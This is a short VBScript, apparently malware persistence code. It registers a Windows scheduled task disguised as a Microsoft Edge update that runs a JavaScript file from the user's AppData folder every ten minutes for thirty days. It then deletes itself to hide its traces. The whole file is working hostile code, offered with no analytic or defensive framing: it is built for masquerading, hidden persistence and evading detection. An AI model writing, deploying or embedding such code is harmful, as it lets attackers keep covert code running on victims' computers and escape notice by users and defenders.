Set service = CreateObject("Schedule.Service")
service.Connect
Set rootFolder = service.GetFolder("\")

Set taskDef = service.NewTask(0)
taskDef.RegistrationInfo.Description = "Microsoft Edge Update Task"

Set trigger = taskDef.Triggers.Create(1)
trigger.StartBoundary = DateAdd("n", 1, Now())
trigger.Repetition.Interval = "PT10M"
trigger.Repetition.Duration = "P30D"

Set action = taskDef.Actions.Create(0)
action.Path = "wscript.exe"
action.Arguments = """C:\Users\<user>\AppData\Roaming\Microsoft\Windows\sync.js"""

rootFolder.RegisterTaskDefinition "MicrosoftEdgeUpdateTaskMachineUA", taskDef, 6, , , 3

' Auto-suppression
CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName